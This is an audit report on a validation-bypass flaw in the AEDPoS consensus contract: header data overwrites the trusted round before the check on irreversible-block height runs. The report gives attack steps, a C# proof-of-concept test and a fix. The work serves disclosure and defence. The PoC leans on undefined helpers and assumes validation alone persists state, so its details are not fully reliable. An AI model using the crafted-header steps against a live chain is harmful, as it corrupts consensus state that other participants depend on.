# Audit Report

## Title
Pre-Validation State Corruption in UpdateValue Consensus Validation Allows Bypassing Last Irreversible Block Height Checks

## Summary
The `ValidateBeforeExecution` method in the AEDPoS consensus contract modifies trusted round state with untrusted block header data before validation occurs, causing the `LibInformationValidationProvider` to compare corrupted values against themselves. This allows miners to set backwards `ImpliedIrreversibleBlockHeight` values, violating the consensus invariant that per-miner LIB heights must monotonically increase.

## Finding Description

The vulnerability is a **Time-of-Check-Time-of-Use (TOCTOU)** issue in the consensus validation flow where state corruption occurs before security checks are performed.

The validation process retrieves trusted `baseRound` from state [1](#0-0)  but immediately modifies it in-place with attacker-controlled data from the block header [2](#0-1) 

The `RecoverFromUpdateValue` method directly overwrites critical consensus fields including `ImpliedIrreversibleBlockHeight` [3](#0-2) 

Since `Round` is a reference type class [4](#0-3)  and the modification affects the local `baseRound` variable, this corrupted round object is then passed to the validation context [5](#0-4) 

For UpdateValue behavior, the `LibInformationValidationProvider` is added to validate LIB information [6](#0-5) 

The validation check attempts to ensure `ImpliedIrreversibleBlockHeight` doesn't decrease [7](#0-6)  However, because `baseRound` was already corrupted at line 19 of `RecoverFromUpdateValue`, the validation compares `baseRound[pubkey].ImpliedIrreversibleBlockHeight > providedRound[pubkey].ImpliedIrreversibleBlockHeight`. Since both now contain the attacker's value, this becomes `attackerValue > attackerValue = false`, causing validation to pass even when the LIB height moves backwards.

The validation context provides `ProvidedRound` as a property that returns the attacker-controlled `ExtraData.Round` [8](#0-7) 

After validation passes, `ProcessUpdateValue` directly assigns the malicious value without additional checks [9](#0-8)  and persists it to state [10](#0-9) 

## Impact Explanation

This vulnerability allows any miner to set their `ImpliedIrreversibleBlockHeight` to arbitrary backwards values, directly violating the consensus invariant that per-miner Last Irreversible Block heights must be monotonically increasing.

**Concrete harms:**

1. **Consensus State Corruption**: Invalid LIB height information is permanently persisted to consensus state, with per-miner values moving backwards (e.g., from 1000 to 500).

2. **LIB Calculation Manipulation**: The corrupted values are used in future LIB calculations [11](#0-10)  which aggregate implied irreversible heights from multiple miners [12](#0-11) 

3. **Finality Guarantee Degradation**: While the round-level `ConfirmedIrreversibleBlockHeight` has a protection preventing backwards movement, the corrupted per-miner values undermine the Byzantine fault tolerance assumptions of the BFT-based LIB calculation. The LIB algorithm relies on sorting and selecting values from per-miner heights [13](#0-12) 

The severity is **Critical** because it directly violates fundamental consensus invariants and enables persistent state corruption that affects the integrity of the entire consensus mechanism.

## Likelihood Explanation

**Attacker Requirements:**
- Must be an active miner in the current round (scheduled mining permission)
- Can craft consensus header information in produced blocks
- No special privileges beyond normal miner capabilities

**Attack Execution:**
1. Miner produces block during their scheduled time slot
2. Crafts block header with `extraData.Round.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight` set to a backwards value (less than their previous value)
3. Includes valid `OutValue` and `Signature` to pass other validation checks
4. The LIB validation passes due to pre-corruption of `baseRound` comparing the attacker's value against itself
5. Block is accepted and malicious data persists to state

**Feasibility:** High - executable during normal mining operations with no unusual chain state required. Detection is difficult as validation appears to pass normally without raising errors.

## Recommendation

Move the `RecoverFromUpdateValue` call to AFTER validation completes, or create a separate copy of the round for validation purposes. The validation should compare the original trusted state against the provided state, not a pre-modified version.

**Fixed approach:**
```csharp
private ValidationResult ValidateBeforeExecution(AElfConsensusHeaderInformation extraData)
{
    if (!TryToGetCurrentRoundInformation(out var baseRound))
        return new ValidationResult { Success = false, Message = "Failed to get current round information." };

    // Create validation context BEFORE modifying baseRound
    var validationContext = new ConsensusValidationContext
    {
        BaseRound = baseRound,  // Unmodified trusted state
        CurrentTermNumber = State.CurrentTermNumber.Value,
        CurrentRoundNumber = State.CurrentRoundNumber.Value,
        PreviousRound = TryToGetPreviousRoundInformation(out var previousRound) ? previousRound : new Round(),
        LatestPubkeyToTinyBlocksCount = State.LatestPubkeyToTinyBlocksCount.Value,
        ExtraData = extraData
    };

    // Add validation providers and validate
    var validationProviders = new List<IHeaderInformationValidationProvider> { /* ... */ };
    var service = new HeaderInformationValidationService(validationProviders);
    var validationResult = service.ValidateInformation(validationContext);
    
    // Only modify baseRound AFTER validation passes
    if (validationResult.Success && extraData.Behaviour == AElfConsensusBehaviour.UpdateValue)
        baseRound.RecoverFromUpdateValue(extraData.Round, extraData.SenderPubkey.ToHex());
        
    return validationResult;
}
```

## Proof of Concept

```csharp
// POC: Demonstrate validation bypass by setting backwards ImpliedIrreversibleBlockHeight
[Fact]
public async Task ProveBackwardsLIBHeightBypassesValidation()
{
    // Setup: Initialize consensus with miner having ImpliedIrreversibleBlockHeight = 1000
    var minerKeyPair = CryptoHelper.GenerateKeyPair();
    var currentRound = GenerateRoundWithMiner(minerKeyPair.PublicKey.ToHex(), libHeight: 1000);
    
    // Attack: Craft block header with backwards LIB height = 500
    var maliciousExtraData = new AElfConsensusHeaderInformation
    {
        Behaviour = AElfConsensusBehaviour.UpdateValue,
        SenderPubkey = ByteString.CopyFrom(minerKeyPair.PublicKey),
        Round = new Round
        {
            RealTimeMinersInformation =
            {
                {
                    minerKeyPair.PublicKey.ToHex(),
                    new MinerInRound
                    {
                        ImpliedIrreversibleBlockHeight = 500,  // Backwards!
                        OutValue = Hash.Generate(),
                        Signature = Hash.Generate()
                    }
                }
            }
        }
    };
    
    // Execute validation - should FAIL but will PASS due to vulnerability
    var validationResult = await ConsensusContract.ValidateConsensusBeforeExecution(maliciousExtraData);
    
    // Vulnerability: Validation passes when it should reject backwards LIB height
    Assert.True(validationResult.Success);  // This should be False but is True
    
    // Verify corruption: The backwards value gets persisted to state
    var updatedRound = await ConsensusContract.GetCurrentRoundInformation.CallAsync(new Empty());
    Assert.Equal(500, updatedRound.RealTimeMinersInformation[minerKeyPair.PublicKey.ToHex()].ImpliedIrreversibleBlockHeight);
}
```

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L19-20)
```csharp
        if (!TryToGetCurrentRoundInformation(out var baseRound))
            return new ValidationResult { Success = false, Message = "Failed to get current round information." };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L46-47)
```csharp
        if (extraData.Behaviour == AElfConsensusBehaviour.UpdateValue)
            baseRound.RecoverFromUpdateValue(extraData.Round, extraData.SenderPubkey.ToHex());
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L52-60)
```csharp
        var validationContext = new ConsensusValidationContext
        {
            BaseRound = baseRound,
            CurrentTermNumber = State.CurrentTermNumber.Value,
            CurrentRoundNumber = State.CurrentRoundNumber.Value,
            PreviousRound = TryToGetPreviousRoundInformation(out var previousRound) ? previousRound : new Round(),
            LatestPubkeyToTinyBlocksCount = State.LatestPubkeyToTinyBlocksCount.Value,
            ExtraData = extraData
        };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L79-83)
```csharp
            case AElfConsensusBehaviour.UpdateValue:
                validationProviders.Add(new UpdateValueValidationProvider());
                // Is confirmed lib height and lib round number went down? (Which should not happens.)
                validationProviders.Add(new LibInformationValidationProvider());
                break;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Recover.cs (L8-20)
```csharp
    public Round RecoverFromUpdateValue(Round providedRound, string pubkey)
    {
        if (!RealTimeMinersInformation.ContainsKey(pubkey) ||
            !providedRound.RealTimeMinersInformation.ContainsKey(pubkey))
            return this;

        var minerInRound = RealTimeMinersInformation[pubkey];
        var providedInformation = providedRound.RealTimeMinersInformation[pubkey];
        minerInRound.OutValue = providedInformation.OutValue;
        minerInRound.Signature = providedInformation.Signature;
        minerInRound.PreviousInValue = providedInformation.PreviousInValue;
        minerInRound.ImpliedIrreversibleBlockHeight = providedInformation.ImpliedIrreversibleBlockHeight;
        minerInRound.ActualMiningTimes.Add(providedInformation.ActualMiningTimes);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L13-13)
```csharp
public partial class Round
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/LibInformationValidationProvider.cs (L23-30)
```csharp
        if (providedRound.RealTimeMinersInformation.ContainsKey(pubkey) &&
            providedRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight != 0 &&
            baseRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight >
            providedRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight)
        {
            validationResult.Message = "Incorrect implied lib height.";
            return validationResult;
        }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/ConsensusValidationContext.cs (L27-27)
```csharp
    public Round ProvidedRound => ExtraData.Round;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L238-249)
```csharp
    private void ProcessUpdateValue(UpdateValueInput updateValueInput)
    {
        TryToGetCurrentRoundInformation(out var currentRound);

        var minerInRound = currentRound.RealTimeMinersInformation[_processingBlockMinerPubkey];
        minerInRound.ActualMiningTimes.Add(updateValueInput.ActualMiningTime);
        minerInRound.Signature = updateValueInput.Signature;
        minerInRound.OutValue = updateValueInput.OutValue;
        minerInRound.SupposedOrderOfNextRound = updateValueInput.SupposedOrderOfNextRound;
        minerInRound.FinalOrderOfNextRound = updateValueInput.SupposedOrderOfNextRound;
        minerInRound.ImpliedIrreversibleBlockHeight = updateValueInput.ImpliedIrreversibleBlockHeight;

```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L268-281)
```csharp
            new LastIrreversibleBlockHeightCalculator(currentRound, previousRound).Deconstruct(
                out var libHeight);
            Context.LogDebug(() => $"Finished calculation of lib height: {libHeight}");
            // LIB height can't be available if it is lower than last time.
            if (currentRound.ConfirmedIrreversibleBlockHeight < libHeight)
            {
                Context.LogDebug(() => $"New lib height: {libHeight}");
                Context.Fire(new IrreversibleBlockFound
                {
                    IrreversibleBlockHeight = libHeight
                });
                currentRound.ConfirmedIrreversibleBlockHeight = libHeight;
                currentRound.ConfirmedIrreversibleBlockRoundNumber = currentRound.RoundNumber.Sub(1);
            }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L284-284)
```csharp
        if (!TryToUpdateRoundInformation(currentRound)) Assert(false, "Failed to update round information.");
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_LIB.cs (L20-33)
```csharp
        public void Deconstruct(out long libHeight)
        {
            if (_currentRound.IsEmpty || _previousRound.IsEmpty) libHeight = 0;

            var minedMiners = _currentRound.GetMinedMiners().Select(m => m.Pubkey).ToList();
            var impliedIrreversibleHeights = _previousRound.GetSortedImpliedIrreversibleBlockHeights(minedMiners);
            if (impliedIrreversibleHeights.Count < _currentRound.MinersCountOfConsent)
            {
                libHeight = 0;
                return;
            }

            libHeight = impliedIrreversibleHeights[impliedIrreversibleHeights.Count.Sub(1).Div(3)];
        }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_ImpliedIrreversibleBlockHeight.cs (L12-19)
```csharp
    public List<long> GetSortedImpliedIrreversibleBlockHeights(List<string> specificPublicKeys)
    {
        var heights = RealTimeMinersInformation.Values.Where(i => specificPublicKeys.Contains(i.Pubkey))
            .Where(i => i.ImpliedIrreversibleBlockHeight > 0)
            .Select(i => i.ImpliedIrreversibleBlockHeight).ToList();
        heights.Sort();
        return heights;
    }
```
